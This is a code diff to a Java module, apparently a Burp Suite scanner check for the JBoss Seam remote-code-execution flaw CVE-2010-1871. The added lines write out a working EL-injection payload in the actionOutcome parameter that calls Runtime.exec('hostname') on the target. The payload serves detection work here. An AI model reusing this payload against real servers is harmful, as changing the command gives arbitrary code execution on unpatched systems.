@@ -31,7 +31,7 @@ public class Seam2RCE implements IModule {
             + "http://blog.o0o.nu/2010/07/cve-2010-1871-jboss-seam-framework.html<br />"
             + "http://blog.scotsts.com/2011/07/30/from-poc-to-shell-cve-2010-1871/<br />"
             + "https://access.redhat.com/security/cve/CVE-2010-1871";
-    
+
     private static final String REMEDY = "Upgrade to the latest version of the SEAM framework.";
 
     private static final byte[] GREP_STRING = "java.lang.UNIXProcess".getBytes();
@@ -47,6 +47,7 @@ public class Seam2RCE implements IModule {
         URL curURL = reqInfo.getUrl();
         byte[] rawRequest = baseRequestResponse.getRequest();
 
+        // ?actionOutcome=
         if (curURL.getPath().contains(".seam")) {
 
             // Skip already tested resources
@@ -56,6 +57,37 @@ public class Seam2RCE implements IModule {
 
             hs.add(curURL.getPath());
 
+            
+            // First test wihtout getDeclaredMethods indexes
+            byte[] rawSimpleRequestSeam = helpers.addParameter(rawRequest,
+                    helpers.buildParameter("actionOutcome",
+                            "/pwd.xhtml?user%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethod('getRuntime').invoke(expressions.getClass().forName('java.lang.Runtime')).exec('hostname')}", IParameter.PARAM_URL)
+            );
+            IRequestInfo rawSimpleRequestSeamInfo = helpers.analyzeRequest(rawSimpleRequestSeam);
+            List<String> headersSimpleRequestSeam = rawSimpleRequestSeamInfo.getHeaders();
+            byte messageSimple[] = helpers.buildHttpMessage(headersSimpleRequestSeam, Arrays.copyOfRange(rawSimpleRequestSeam, rawSimpleRequestSeamInfo.getBodyOffset(), rawSimpleRequestSeam.length));
+            IHttpRequestResponse respSimple = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), messageSimple);
+            // look for matches of our active check grep string in the response body
+            byte[] httpResponseSimple = respSimple.getResponse();
+            List<int[]> matchesSimple = getMatches(httpResponseSimple, GREP_STRING, helpers);
+            if (matchesSimple.size() > 0) {
+
+                issues.add(new CustomScanIssue(
+                        baseRequestResponse.getHttpService(),
+                        reqInfo.getUrl(),
+                        respSimple,
+                        TITLE,
+                        DESCRIPTION,
+                        REMEDY,
+                        Risk.High,
+                        Confidence.Certain
+                ));
+
+                return issues;
+            }
+
+            
+            
             for (int i = 1; i <= 26; i++) {
 
                 byte[] rawRequestSeam = helpers.addParameter(rawRequest,
